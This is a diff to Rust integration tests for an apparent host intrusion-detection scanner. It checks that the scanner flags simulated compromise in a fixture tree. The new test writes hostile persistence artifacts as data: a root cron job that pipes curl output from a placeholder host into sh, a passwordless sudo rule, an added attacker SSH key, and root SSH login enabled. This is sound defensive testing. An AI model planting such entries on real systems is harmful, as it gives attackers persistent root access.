@@ -63,8 +63,13 @@ fn clean_host_exits_zero() {
     let r = json(&o);
     assert_eq!(r["schema_version"], 1);
     assert_eq!(r["ok"], true);
-    assert_eq!(r["checks"][0]["id"], "kernel-tainted");
-    assert_eq!(r["checks"][0]["status"], "ok");
+    let kt = r["checks"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|c| c["id"] == "kernel-tainted")
+        .unwrap();
+    assert_eq!(kt["status"], "ok");
     assert!(r["findings"].as_array().unwrap().is_empty());
     std::fs::remove_dir_all(dir).unwrap();
 }
@@ -132,7 +137,11 @@ fn severity_override_and_disable() {
     assert!(run(&dir, "tainted", &["disable", "kernel-tainted"]).status.success());
     let o = run(&dir, "tainted", &["--json", "scan"]);
     let r = json(&o);
-    assert!(r["checks"].as_array().unwrap().is_empty());
+    assert!(!r["checks"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .any(|c| c["id"] == "kernel-tainted"));
     // Disabling a check drops its open findings.
     assert_eq!(o.status.code(), Some(0));
     assert!(r["findings"].as_array().unwrap().is_empty());
@@ -167,5 +176,110 @@ fn unknown_names_are_errors() {
     assert_eq!(run(&dir, "clean", &["scan", "--check", "nope"]).status.code(), Some(1));
     assert_eq!(run(&dir, "clean", &["accept", "nope:x"]).status.code(), Some(1));
     assert_eq!(run(&dir, "clean", &["enable", "nope"]).status.code(), Some(1));
+    std::fs::remove_dir_all(dir).unwrap();
+}
+
+/// Copy a fixture tree so a test can change it.
+fn mutable_fixture(name: &str) -> PathBuf {
+    let dir = temp_config();
+    let root = dir.join("root");
+    let st = Command::new("cp")
+        .arg("-a")
+        .arg(fixture(name))
+        .arg(&root)
+        .status()
+        .unwrap();
+    assert!(st.success());
+    root
+}
+
+fn run_at(config: &Path, root: &Path, args: &[&str]) -> Output {
+    Command::new(env!("CARGO_BIN_EXE_minsec-id"))
+        .args(["--config-dir", config.to_str().unwrap(), "--root"])
+        .arg(root)
+        .args(args)
+        .output()
+        .unwrap()
+}
+
+fn keys(report: &Value) -> Vec<String> {
+    let mut v: Vec<String> = report["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .map(|f| format!("{}:{}", f["check"].as_str().unwrap(), f["subject"].as_str().unwrap()))
+        .collect();
+    v.sort();
+    v
+}
+
+#[test]
+fn debian_host_findings_and_baselines() {
+    let dir = temp_config();
+    // Every file is in today's sample: checkouts give fixtures fresh ctimes.
+    std::fs::write(dir.join("conf.d/sample.toml"), "[scan]\nsample_days = 1\n").unwrap();
+    let root = mutable_fixture("debian");
+
+    let o = run_at(&dir, &root, &["--json", "scan", "--full"]);
+    assert_eq!(o.status.code(), Some(2), "{}", String::from_utf8_lossy(&o.stderr));
+    let r = json(&o);
+    assert_eq!(
+        keys(&r),
+        vec![
+            "account-password-empty:bob",
+            "account-uid0:toor",
+            "exe-unowned:/usr/bin/evil",
+            "persist-new:/usr/lib/x86_64-linux-gnu/security/pam_evil.so",
+            "pkg-modified:/usr/bin/cat", // listed as /bin/cat: merged /usr is resolved
+            "repo-insecure:apt:deb http://packages.example.net/ ./",
+        ]
+    );
+
+    // Changes after the baseline.
+    let ssh = root.join("home/bob/.ssh/authorized_keys");
+    let mut keys_file = std::fs::read_to_string(&ssh).unwrap();
+    keys_file.push_str("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOPs70L5+d7gOW/qivX21bhnl/o6qyNdUxrwM1kBN/DJ mallory\n");
+    std::fs::write(&ssh, keys_file).unwrap();
+    std::fs::write(root.join("etc/sudoers.d/www"), "www-data ALL=(ALL) NOPASSWD: ALL\n").unwrap();
+    std::fs::create_dir_all(root.join("etc/cron.d")).unwrap();
+    std::fs::write(root.join("etc/cron.d/update"), "* * * * * root curl -s http://x | sh\n").unwrap();
+    std::fs::write(root.join("etc/ssh/sshd_config"), "Port 22\nPermitRootLogin yes\n").unwrap();
+    std::fs::write(root.join("usr/bin/cat"), "cat-original\n").unwrap();
+
+    let r = json(&run_at(&dir, &root, &["--json", "scan", "--full"]));
+    let k = keys(&r);
+    for want in [
+        "persist-new:/etc/cron.d/update",
+        "persist-new:/etc/sudoers.d/www",
+        "sudo-nopasswd:www-data ALL=(ALL) NOPASSWD: ALL",
+        "persist-changed:/etc/ssh/sshd_config",
+    ] {
+        assert!(k.iter().any(|x| x == want), "missing {want} in {k:?}");
+    }
+    assert!(k.iter().any(|x| x.starts_with("ssh-key-new:bob:SHA256:")), "{k:?}");
+    assert!(
+        !k.iter().any(|x| x.starts_with("pkg-config-modified:")),
+        "one finding per edit: {k:?}"
+    );
+    // Restoring the binary resolves its finding.
+    assert!(!k.iter().any(|x| x == "pkg-modified:/usr/bin/cat"));
+
+    // After review, reset one baseline: its findings resolve, others stay.
+    assert!(run_at(&dir, &root, &["baseline", "--reset", "--check", "ssh-key-new"])
+        .status
+        .success());
+    let r = json(&run_at(&dir, &root, &["--json", "scan", "--full"]));
+    let k = keys(&r);
+    assert!(!k.iter().any(|x| x.starts_with("ssh-key-new:")), "{k:?}");
+    assert!(k.iter().any(|x| x == "persist-new:/etc/cron.d/update"));
+
+    // verify, by path and by package.
+    std::fs::write(root.join("usr/bin/cat"), "cat-trojaned\n").unwrap();
+    assert_eq!(run_at(&dir, &root, &["verify", "/bin/cat"]).status.code(), Some(2));
+    assert_eq!(run_at(&dir, &root, &["verify", "/usr/bin/ls"]).status.code(), Some(0));
+    let v = json(&run_at(&dir, &root, &["--json", "verify", "coreutils"]));
+    assert_eq!(v["files"], 4); // /usr and /usr/bin are owned paths too
+    assert_eq!(v["findings"][0]["subject"], "/usr/bin/cat");
+    assert_eq!(run_at(&dir, &root, &["verify", "/usr/bin/evil"]).status.code(), Some(1));
     std::fs::remove_dir_all(dir).unwrap();
 }
